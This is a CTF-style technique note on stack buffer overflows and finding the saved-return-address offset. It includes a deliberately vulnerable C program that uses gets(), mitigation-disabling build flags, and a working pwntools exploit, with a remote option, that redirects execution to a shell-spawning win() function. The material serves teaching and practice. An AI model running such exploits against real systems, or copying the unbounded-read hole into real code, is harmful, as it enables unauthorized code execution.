---
title: "Stack Buffer Overflow - Basics and Finding the Offset"
category: pwn
subcategory: stack-overflow
type: technique
tags: [stack-overflow, buffer-overflow, gets, strcpy, scanf, read, memcpy, cyclic, de-bruijn, saved-rip, pwntools, gdb, gef, pwndbg, checksec, core-dump, nx, aslr, pie, canary]
difficulty: easy
summary: "Overflow a fixed stack buffer into the saved return address, then find the exact offset with a De Bruijn pattern, a core dump, or gdb."
when_to_use:
  - "The binary reads into a fixed-size stack buffer with gets/scanf(\"%s\")/read with an oversized length"
  - "You get SIGSEGV with a controlled value in RIP/EIP (or in a register the fault touched)"
  - "checksec shows No canary found, and you need to reach the saved return address"
  - "You already have a target address (win function, one_gadget, ROP chain) and only need the offset"
  - "A crash address looks like ASCII (0x6161616161616166) - a pattern is already in RIP"
tools: [pwntools, gdb, gef, pwndbg, checksec, ropgadget, cyclic, objdump]
related: [stack-ret2win, stack-integer-bugs, stack-uninitialized-leak, rop-fundamentals, rop-ret2libc, shellcode-ret2shellcode, mitigation-canary-bypass]
---

## TL;DR

A stack buffer overflow writes past the end of a local array and clobbers the saved
frame pointer and the saved return address that `ret` pops. Control the saved return
address and you control execution. The whole first half of the job is a counting
problem: find the exact byte offset from the start of your input to the saved RIP.

## Recognise it

- Source / decompilation shows a stack array plus an unbounded copy:
  `gets(buf)`, `scanf("%s", buf)`, `strcpy(buf, argv[1])`, `sprintf(buf, fmt, x)`.
- A bounded-looking call whose bound is wrong: `read(0, buf, 0x100)` where `buf[0x20]`,
  or `memcpy(buf, src, len)` with attacker-controlled `len`.
- Ghidra/IDA shows `char local_48 [64]` and a read of more than 64 bytes into it.
- The program crashes on long input, and `info registers` in gdb shows your bytes in
  RIP, RBP, or in a pointer that was dereferenced.
- `checksec` says `Stack: No canary found` - nothing sits between the buffer and saved RIP.
- The binary ships with a `win()`/`flag()`/`shell()` function that is never called.

Quick triage:

```sh
# What protections are on? Canary/NX/PIE/RELRO change the whole plan.
checksec --file=./vuln
# Dangerous imports at a glance.
objdump -d --no-show-raw-insn ./vuln | grep -E 'call.*(gets|strcpy|sprintf|scanf|read|memcpy)'
# Unreferenced interesting symbols.
nm -C ./vuln | grep -iE ' (t|T) .*(win|flag|shell|secret|admin)'
```

## Vulnerable source

```c
/* vuln.c - classic unbounded read into a 64-byte stack buffer */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
    puts("[+] win() reached");
    system("/bin/sh");
    _exit(0);
}

void vuln(void) {
    char buf[64];
    printf("input> ");
    fflush(stdout);
    gets(buf);                 /* no bound at all */
    printf("you said: %s\n", buf);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

Build it with every mitigation off so the mechanism is visible:

```sh
# -fno-stack-protector : no canary between buf and saved rbp/rip
# -z execstack         : stack is RWX (only needed if you want ret2shellcode later)
# -no-pie              : fixed load address, so win() has a constant address
# -m64                 : 64-bit build (use -m32 for the 32-bit variant)
# -w                   : silence the gets() deprecation noise
gcc -fno-stack-protector -z execstack -no-pie -m64 -w -o vuln vuln.c
```

## Theory

On x86-64 System V, `vuln()`'s frame right after its prologue looks like this, from
low addresses to high:

```
rsp -> [ ...local scratch... ]
       [ buf[0] .. buf[63]   ]   <- your input starts here
       [ saved rbp           ]   8 bytes
       [ saved rip           ]   8 bytes  <- what `ret` pops into RIP
       [ caller's locals ... ]
```

`gets` writes forward from `buf[0]` with no limit, so byte `N` of your input lands at
`buf + N`. If the compiler puts `buf` immediately below the saved rbp, the offset to
saved rip is `sizeof(buf) + 8`. That is the *theoretical* offset, and it is often
wrong: the compiler inserts alignment padding, may keep a copy of a register in the
frame, or may place `buf` higher in the frame than you expect. Never guess - measure.

On 32-bit x86 the layout is the same with 4-byte slots: `[buf][saved ebp][saved eip]`,
so the offset is `sizeof(buf) + 4` in the ideal case.

### De Bruijn patterns

A De Bruijn sequence of order `n` over an alphabet of size `k` contains every possible
length-`n` substring exactly once. pwntools' `cyclic()` uses `n=4` (or `n=8` with
`-n 8`) over lowercase letters, so any 4 (or 8) consecutive bytes you recover from the
crash identify a unique position in the sequence. That turns "my program crashed" into
an exact integer offset in one shot.

`cyclic(200)` starts `aaaabaaacaaadaaa...`. If RIP contains `0x6161616261616161`
(little-endian `"aaaabaaa"`), then `cyclic_find("aaaabaaa", n=8)` returns 4.

On x86-64 the address in RIP is only 6 bytes wide (canonical addresses), so a full
8-byte pattern chunk will often fault *before* the `ret` completes and you will read
the pattern off `rsp` instead. Both work - see the workflow below.

## Attack

1. `checksec` the binary. No canary is the happy path. A canary means you need a leak
   first (see `mitigation-canary-bypass`).
2. Send a long De Bruijn pattern and crash the program.
3. Recover the pattern bytes: from `RIP`, from `[rsp]` at the fault, or from the core
   dump's fault address.
4. Convert to an offset with `cyclic_find`.
5. Verify: send `b"A" * offset + b"BBBBBBBB"` and confirm RIP (or `[rsp]`) is
   `0x4242424242424242`.
6. Replace the 8 `B`s with your target: a `win()` address (`stack-ret2win`), a ROP
   chain (`rop-fundamentals`), or a stack address holding shellcode
   (`shellcode-ret2shellcode`).

## Debugging workflow

Three independent ways to get the offset. Use whichever the environment allows.

### 1. pwntools + core dump (no gdb needed)

```sh
# Make sure the kernel actually writes a core file next to the binary.
ulimit -c unlimited
echo core | sudo tee /proc/sys/kernel/core_pattern
```

Then `p.corefile` in pwntools gives you `core.fault_addr`, `core.rip`, `core.rsp`.

### 2. gdb + gef/pwndbg

```
gdb ./vuln
gef> pattern create 200          # gef
pwndbg> cyclic 200               # pwndbg
gef> run
  (paste the pattern)
gef> info registers rip rsp rbp
gef> x/gx $rsp
gef> pattern search $rsp         # gef resolves the offset for you
pwndbg> cyclic -l 0x6161616261616161
```

### 3. Manual, from the SIGSEGV address

If the faulting address printed by dmesg or by the core dump looks like ASCII letters,
byte-swap it and feed it to `cyclic_find` directly.

```sh
# dmesg often prints: vuln[1234]: segfault at 6161616261616161 ip ...
dmesg | tail -n 5
```

## Exploit

```python
#!/usr/bin/env python3
"""Find the saved-rip offset for a stack overflow, then jump to win().

Usage:
    ./exploit.py                 # local, auto-find offset via core dump
    ./exploit.py HOST PORT       # remote, reuse the offset cached below
    ./exploit.py --offset 72     # skip the search entirely
"""
from pwn import *
import sys

BINARY = "./vuln"

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "info"

# If you already know it, hardcode it here and skip find_offset().
KNOWN_OFFSET = None


def find_offset(length=400):
    """Crash the binary with a De Bruijn pattern and read the offset back."""
    log.info("searching for saved-rip offset with a %d byte pattern", length)
    pattern = cyclic(length, n=8)

    p = process(BINARY)
    p.sendline(pattern)
    p.wait()

    core = p.corefile
    # Preferred: the value that was about to be popped into rip.
    try:
        chunk = core.read(core.rsp, 8)
    except Exception:
        chunk = b""

    if chunk and chunk.strip(b"\x00"):
        try:
            off = cyclic_find(chunk, n=8)
            if off >= 0:
                log.success("offset from [rsp] = %d", off)
                return off
        except ValueError:
            pass

    # Fallback: the fault address itself is the clobbered return address.
    fault = core.fault_addr
    chunk = pack(fault)
    try:
        off = cyclic_find(chunk, n=8)
    except ValueError:
        off = -1
    if off < 0:
        # 6-byte canonical truncation: retry with the low 4 bytes, n=4 alphabet.
        off = cyclic_find(pack(fault & 0xFFFFFFFF, word_size=32), n=4)
    log.success("offset from fault address = %d", off)
    return off


def start():
    if len(sys.argv) >= 3 and not sys.argv[1].startswith("-"):
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BINARY)


def main():
    offset = KNOWN_OFFSET
    if "--offset" in sys.argv:
        offset = int(sys.argv[sys.argv.index("--offset") + 1])
    if offset is None:
        offset = find_offset()

    win = elf.symbols["win"]
    log.info("offset=%d  win=%#x", offset, win)

    payload = flat({offset: p64(win)}, filler=b"A")

    io = start()
    io.sendlineafter(b"input> ", payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

A minimal sanity-check harness you can run without the binary, to confirm the
pattern arithmetic itself:

```python
#!/usr/bin/env python3
"""Self-test of the De Bruijn offset math - no target binary required."""
from pwn import *

context.arch = "amd64"


def simulate_overflow(pattern, buf_size=64, saved_rbp=8):
    """Pretend a buf of buf_size bytes sits right below saved rbp + saved rip."""
    off = buf_size + saved_rbp
    return pattern[off:off + 8]


def main():
    pat = cyclic(400, n=8)
    leaked = simulate_overflow(pat)
    found = cyclic_find(leaked, n=8)
    log.info("leaked chunk = %r", leaked)
    log.info("recovered offset = %d", found)
    assert found == 72, found
    log.success("De Bruijn round-trip OK")


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **Offset is not `sizeof(buf) + 8`.** Alignment padding, saved registers and
  re-ordered locals all shift it. Measure with a pattern every single time.
- **`scanf("%s")` stops at whitespace.** Space (0x20), tab, newline and other
  whitespace terminate the read, so your payload cannot contain them. Same class of
  restriction as `gets` stopping on `\n`.
- **`strcpy`/`sprintf` stop at a NUL byte.** Any `\x00` in the middle of your payload
  truncates it. `read()` and `memcpy()` are byte-safe and take arbitrary bytes.
- **`fgets(buf, n, stdin)` is usually safe**, but `fgets(buf, len, stdin)` where `len`
  is computed is not - see `stack-integer-bugs`.
- **Canary present.** A random 8-byte value sits between the locals and saved rbp; the
  low byte is `\x00`. Overwriting it makes `__stack_chk_fail` abort. You need to leak
  it or avoid it (`mitigation-canary-bypass`).
- **PIE.** `win()`'s address changes every run; you need a leak of any code pointer to
  rebase, or a partial overwrite (`mitigation-partial-overwrite-brute`).
- **ASLR on a remote host** makes stack addresses useless without a leak, but the
  *offset* you measured locally is a property of the binary, not the environment - it
  transfers.
- **No core file appears.** Some distros pipe cores to `systemd-coredump` or apport.
  Reset `/proc/sys/kernel/core_pattern` to `core`, or just use gdb.
- **32-bit targets.** Use `cyclic(n=4)`, `p32`, and remember the saved-eip offset is
  `sizeof(buf) + 4` in the ideal layout.
- **The crash is not at `ret`.** If `printf("%s", buf)` or a `free()` runs before the
  function returns and faults first, shorten the payload or fix up the clobbered
  pointer so execution reaches the `ret`.
- **Your input is echoed.** Free info leak - if the buffer is printed before it is
  fully NUL-terminated, you may already have a stack/libc leak
  (`stack-uninitialized-leak`).

## Tools

- `pwntools` - `cyclic`, `cyclic_find`, `flat`, `p.corefile`, `ELF`, `process/remote`.
- `gdb` with `gef` (`pattern create` / `pattern search`) or `pwndbg`
  (`cyclic` / `cyclic -l`).
- `checksec` - canary / NX / PIE / RELRO in one line.
- `ROPgadget` or `ropper` - once you have the offset, for the next stage.
- `objdump -d`, `nm`, `readelf -s` - find `win()`-style symbols and call sites.
- `ltrace` / `strace` - spot the unbounded copy at runtime without source.
